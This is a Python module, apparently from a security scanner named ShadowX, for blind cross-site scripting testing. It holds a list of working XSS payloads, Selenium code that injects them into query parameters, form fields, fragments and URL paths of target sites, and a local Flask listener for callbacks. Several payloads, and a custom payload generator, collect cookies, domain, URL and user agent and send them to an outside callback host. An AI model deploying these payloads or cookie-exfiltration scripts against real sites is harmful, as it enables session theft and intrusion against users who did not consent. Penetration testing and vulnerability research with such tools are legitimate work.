"""
Blind XSS Detection Module for ShadowX
Handles webhook-based blind XSS detection
"""

import time
import requests
import json
import threading
import hashlib
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
from selenium.webdriver.common.by import By
import os

class BlindXSSManager:
    def __init__(self, webhook_url=None, interaction_timeout=60):
        self.webhook_url = webhook_url
        self.interaction_timeout = interaction_timeout
        self.payloads_sent = {}
        self.interactions_received = []
        self.lock = threading.Lock()
        
        # Generate unique session ID
        self.session_id = hashlib.md5(f"shadowx_{time.time()}".encode()).hexdigest()[:8]
        
        # Blind XSS payload templates
        self.blind_payloads = [
            # Basic image callback
            '<img src="{{WEBHOOK_URL}}/img/{{UNIQUE_ID}}">',
            '<script>new Image().src="{{WEBHOOK_URL}}/js/{{UNIQUE_ID}}";</script>',
            
            # Fetch API callback
            '<script>fetch("{{WEBHOOK_URL}}/fetch/{{UNIQUE_ID}}");</script>',
            
            # XHR callback
            '<script>var xhr=new XMLHttpRequest();xhr.open("GET","{{WEBHOOK_URL}}/xhr/{{UNIQUE_ID}}");xhr.send();</script>',
            
            # WebSocket callback (if supported)
            '<script>try{var ws=new WebSocket("ws://{{WEBHOOK_DOMAIN}}/ws/{{UNIQUE_ID}}");}catch(e){}</script>',
            
            # DNS callback (for advanced detection)
            '<script>new Image().src="http://{{UNIQUE_ID}}.{{WEBHOOK_DOMAIN}}/dns";</script>',
            
            # Form submission callback
            '<form action="{{WEBHOOK_URL}}/form/{{UNIQUE_ID}}" method="GET"><input name="data" value="blind_xss"></form><script>document.forms[0].submit();</script>',
            
            # CSS callback
            '<style>@import "{{WEBHOOK_URL}}/css/{{UNIQUE_ID}}";</style>',
            '<link rel="stylesheet" href="{{WEBHOOK_URL}}/css/{{UNIQUE_ID}}">',
            
            # iframe callback
            '<iframe src="{{WEBHOOK_URL}}/iframe/{{UNIQUE_ID}}"></iframe>',
            
            # Object/embed callbacks
            '<object data="{{WEBHOOK_URL}}/object/{{UNIQUE_ID}}"></object>',
            '<embed src="{{WEBHOOK_URL}}/embed/{{UNIQUE_ID}}">',
            
            # Event handler callbacks
            '<div onmouseover="new Image().src=\'{{WEBHOOK_URL}}/event/{{UNIQUE_ID}}\'"></div>',
            '<span onclick="fetch(\'{{WEBHOOK_URL}}/click/{{UNIQUE_ID}}\')"></span>',
            
            # Advanced JavaScript callbacks with data exfiltration
            '''<script>
                var data = {
                    url: window.location.href,
                    domain: document.domain,
                    cookies: document.cookie,
                    timestamp: new Date().getTime(),
                    useragent: navigator.userAgent,
                    referrer: document.referrer
                };
                fetch("{{WEBHOOK_URL}}/data/{{UNIQUE_ID}}", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify(data)
                });
            </script>''',
            
            # Storage-based callbacks
            '<script>localStorage.setItem("xss_{{UNIQUE_ID}}", "{{WEBHOOK_URL}}");new Image().src="{{WEBHOOK_URL}}/storage/{{UNIQUE_ID}}";</script>',
            
            # WebRTC callbacks (for modern browsers)
            '''<script>
                try {
                    var pc = new RTCPeerConnection();
                    pc.createDataChannel("");
                    pc.createOffer().then(offer => {
                        fetch("{{WEBHOOK_URL}}/webrtc/{{UNIQUE_ID}}", {
                            method: "POST",
                            body: JSON.stringify(offer)
                        });
                    });
                } catch(e) {}
            </script>''',
        ]
        
    def _generate_unique_id(self, url, payload_index):
        """Generate unique ID for tracking blind XSS payloads"""
        data = f"{self.session_id}_{url}_{payload_index}_{time.time()}"
        return hashlib.md5(data.encode()).hexdigest()[:12]
        
    def _prepare_payload(self, payload_template, unique_id):
        """Prepare payload by replacing placeholders"""
        if not self.webhook_url:
            return None
            
        parsed_webhook = urlparse(self.webhook_url)
        webhook_domain = parsed_webhook.netloc
        
        payload = payload_template.replace('{{WEBHOOK_URL}}', self.webhook_url)
        payload = payload.replace('{{WEBHOOK_DOMAIN}}', webhook_domain)
        payload = payload.replace('{{UNIQUE_ID}}', unique_id)
        
        return payload
        
    def _inject_blind_payload(self, driver, url, payload, injection_point, param_name=None):
        """Inject blind XSS payload into target"""
        try:
            if injection_point == 'query_param' and param_name:
                parsed_url = urlparse(url)
                params = parse_qs(parsed_url.query, keep_blank_values=True)
                params[param_name] = [payload]
                new_query = urlencode(params, doseq=True)
                test_url = urlunparse((
                    parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                    parsed_url.params, new_query, parsed_url.fragment
                ))
                driver.get(test_url)
                
            elif injection_point == 'form_field':
                forms = driver.find_elements(By.TAG_NAME, 'form')
                for form in forms:
                    inputs = form.find_elements(By.TAG_NAME, 'input')
                    textareas = form.find_elements(By.TAG_NAME, 'textarea')
                    
                    for element in inputs + textareas:
                        try:
                            if element.get_attribute('type') not in ['submit', 'button', 'hidden']:
                                element.clear()
                                element.send_keys(payload)
                        except:
                            pass
                            
                    try:
                        submit_btn = form.find_element(By.XPATH, './/input[@type="submit"] | .//button[@type="submit"] | .//button[not(@type)]')
                        submit_btn.click()
                        break
                    except:
                        try:
                            form.submit()
                            break
                        except:
                            pass
                            
            elif injection_point == 'fragment':
                test_url = f"{url}#{payload}"
                driver.get(test_url)
                
            elif injection_point == 'path':
                parsed_url = urlparse(url)
                new_path = f"{parsed_url.path}/{payload}"
                test_url = urlunparse((
                    parsed_url.scheme, parsed_url.netloc, new_path,
                    parsed_url.params, parsed_url.query, parsed_url.fragment
                ))
                driver.get(test_url)
                
            # Wait for page to load
            time.sleep(2)
            return True
            
        except Exception as e:
            return False
            
    def test_blind_xss(self, driver, url, injection_points):
        """Test for blind XSS vulnerabilities"""
        if not self.webhook_url:
            return []
            
        results = []
        
        # Record start time for this URL
        start_time = time.time()
        
        # Test each payload at each injection point
        for i, payload_template in enumerate(self.blind_payloads):
            unique_id = self._generate_unique_id(url, i)
            payload = self._prepare_payload(payload_template, unique_id)
            
            if not payload:
                continue
                
            # Store payload info for tracking
            with self.lock:
                self.payloads_sent[unique_id] = {
                    'url': url,
                    'payload': payload,
                    'timestamp': time.time(),
                    'template': payload_template
                }
                
            # Test at each injection point
            for injection_point, param_name in injection_points:
                try:
                    success = self._inject_blind_payload(driver, url, payload, injection_point, param_name)
                    if success:
                        # Brief delay between injections
                        time.sleep(1)
                except Exception:
                    continue
                    
        # Wait for potential interactions
        self._wait_for_interactions(self.interaction_timeout)
        
        # Check for received interactions
        with self.lock:
            for interaction in self.interactions_received:
                unique_id = interaction.get('unique_id')
                if unique_id in self.payloads_sent:
                    payload_info = self.payloads_sent[unique_id]
                    
                    vulnerability_id = hashlib.md5(f"blind_{url}_{unique_id}".encode()).hexdigest()[:8]
                    
                    result = {
                        'id': vulnerability_id,
                        'url': payload_info['url'],
                        'type': 'Blind XSS',
                        'payload': payload_info['payload'],
                        'injection_point': 'unknown',  # We don't know which injection point worked
                        'parameter': None,
                        'reflected': False,
                        'javascript_executed': True,
                        'dom_modified': False,
                        'evidence': {
                            'javascript': f'Blind XSS callback received: {interaction}',
                            'dom': None
                        },
                        'screenshot': None,
                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                        'context': 'Blind XSS - external callback',
                        'interaction_data': interaction
                    }
                    
                    results.append(result)
                    
        return results
        
    def _wait_for_interactions(self, timeout):
        """Wait for blind XSS interactions"""
        # In a real implementation, this would:
        # 1. Poll the webhook service for new interactions
        # 2. Check for DNS requests to controlled domains
        # 3. Monitor for HTTP requests to webhook URLs
        
        # For this implementation, we'll simulate checking a webhook service
        # In practice, you would integrate with services like:
        # - Interactsh (https://github.com/projectdiscovery/interactsh)
        # - Webhook.site
        # - Your own webhook service
        
        if not self.webhook_url:
            return
            
        end_time = time.time() + timeout
        
        while time.time() < end_time:
            try:
                # Try to check for interactions
                # This is a placeholder - implement actual webhook checking
                self._check_webhook_interactions()
                time.sleep(5)  # Check every 5 seconds
            except Exception:
                pass
                
    def _check_webhook_interactions(self):
        """Check webhook service for new interactions"""
        # This is a placeholder implementation
        # In a real scenario, you would:
        # 1. Query your webhook service API
        # 2. Parse DNS logs if using DNS callbacks
        # 3. Check HTTP access logs
        
        try:
            # Example for webhook.site (if using their API)
            if self.webhook_url and 'webhook.site' in self.webhook_url:
                # webhook.site doesn't have a direct API, but you could
                # implement a custom service that logs requests
                pass
                
            # Example for custom webhook service
            elif self.webhook_url and '/api/' in self.webhook_url:
                # Query your custom webhook service
                api_url = self.webhook_url.replace('/webhook/', '/api/interactions/')
                response = requests.get(api_url, timeout=10)
                
                if response.status_code == 200:
                    interactions = response.json()
                    
                    with self.lock:
                        for interaction in interactions:
                            if interaction not in self.interactions_received:
                                self.interactions_received.append(interaction)
                                
        except Exception as e:
            # Silently handle webhook checking errors
            pass
            
    def setup_local_webhook(self, port=8080):
        """Setup a local webhook listener for blind XSS detection"""
        try:
            from flask import Flask, request, jsonify
            import threading
            
            app = Flask(__name__)
            
            @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
            def webhook_handler(path):
                # Extract unique ID from path
                path_parts = path.split('/')
                unique_id = path_parts[-1] if path_parts else 'unknown'
                
                interaction_data = {
                    'unique_id': unique_id,
                    'method': request.method,
                    'path': path,
                    'headers': dict(request.headers),
                    'remote_addr': request.remote_addr,
                    'user_agent': request.headers.get('User-Agent', ''),
                    'timestamp': time.time(),
                    'data': request.get_data(as_text=True) if request.data else None
                }
                
                # Store interaction
                with self.lock:
                    self.interactions_received.append(interaction_data)
                    
                print(f"[BLIND XSS] Interaction received for {unique_id}")
                
                return jsonify({'status': 'success'}), 200
                
            def run_server():
                app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
                
            # Start webhook server in background thread
            server_thread = threading.Thread(target=run_server, daemon=True)
            server_thread.start()
            
            # Update webhook URL to local server
            self.webhook_url = f"http://127.0.0.1:{port}"
            
            print(f"[BLIND XSS] Local webhook server started on port {port}")
            return True
            
        except ImportError:
            print("[BLIND XSS] Flask not available for local webhook server")
            return False
        except Exception as e:
            print(f"[BLIND XSS] Failed to start local webhook server: {e}")
            return False
            
    def generate_custom_blind_payload(self, callback_url, data_to_exfiltrate=None):
        """Generate custom blind XSS payload"""
        if not data_to_exfiltrate:
            data_to_exfiltrate = [
                'document.domain',
                'document.cookie',
                'window.location.href',
                'navigator.userAgent'
            ]
            
        data_collection = "var data = {" + ",".join([
            f'"{field.split(".")[-1]}": {field}' for field in data_to_exfiltrate
        ]) + "};"
        
        payload = f'''<script>
            {data_collection}
            fetch("{callback_url}", {{
                method: "POST",
                headers: {{"Content-Type": "application/json"}},
                body: JSON.stringify(data)
            }}).catch(function(){{
                new Image().src = "{callback_url}?" + btoa(JSON.stringify(data));
            }});
        </script>'''
        
        return payload
        
    def cleanup(self):
        """Cleanup blind XSS manager resources"""
        with self.lock:
            self.payloads_sent.clear()
            self.interactions_received.clear()
